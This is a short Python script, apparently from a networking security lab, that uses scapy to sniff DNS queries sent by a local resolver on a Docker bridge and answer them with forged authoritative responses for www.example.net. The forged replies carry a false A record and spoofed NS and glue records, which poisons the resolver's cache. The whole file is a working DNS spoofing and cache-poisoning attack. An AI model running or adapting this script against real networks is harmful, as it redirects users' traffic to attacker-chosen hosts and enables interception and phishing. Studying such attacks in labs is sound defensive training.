#!/user/bin/python
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and b'www.example.net' in pkt[DNS].qd.qname):
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.9.0.1')
        NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='ns1.example.net')
        NSsec2 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='ns2.example.net')
        Addsec1 = DNSRR(rrname='ns1.example.net', type='A', ttl=259200, rdata='1.2.3.4')
        Addsec2 = DNSRR(rrname='ns2.example.net', type='A', ttl=259200, rdata='5.6.7.8')

        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                     qdcount=1, ancount=1, nscount=2, arcount=2,
                     an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)

        spoofpkt = IPpkt/UDPpkt/DNSpkt

        print("Sending spoofed packet")
        send(spoofpkt)

# NOTE: Without the iface argument, running inside a docker container leads to scapy not
# sniffing properly. This argument MUST be changed to match the correct interface when
# running on a different host.
pkt = sniff(filter='udp and (src host 10.9.0.53 and dst port 53)',
            iface='br-3761e470b177', prn=spoof_dns)
